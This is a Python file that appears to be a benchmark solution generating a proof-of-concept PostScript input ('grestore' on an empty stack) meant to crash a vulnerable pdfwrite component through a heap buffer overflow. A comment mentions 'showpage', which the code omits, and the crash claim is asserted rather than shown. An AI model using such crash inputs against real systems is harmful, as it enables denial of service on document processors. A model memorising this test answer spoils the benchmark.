import os

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Buffer Overflow
    in pdfwrite by causing a graphics state stack underflow.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability description indicates that a restore operation on the
        viewer state is performed without checking if the viewer depth is at least 1.
        In PostScript, this corresponds to the graphics state stack managed by
        `gsave` and `grestore`.

        Calling `grestore` without a preceding `gsave` will attempt to pop from an
        empty stack. The lack of a depth check causes the program to proceed with
        the restore operation using invalid data (e.g., from an out-of-bounds
        read), leading to a crash.

        A minimal PostScript file containing just the `grestore` command is
        sufficient to trigger this underflow and crash the vulnerable program.

        Args:
            src_path: Path to the vulnerable source code tarball (unused in this solution).

        Returns:
            bytes: The PoC PostScript input that triggers the vulnerability.
        """
        # A minimal PostScript file.
        # %!PS-Adobe-3.0 is the standard header.
        # `grestore` is the command that restores the graphics state. Calling it on
        # an empty stack triggers the vulnerability.
        # `showpage` can help ensure commands are flushed and processed.
        poc_content = b"%!PS-Adobe-3.0\ngrestore\n"
        
        return poc_content
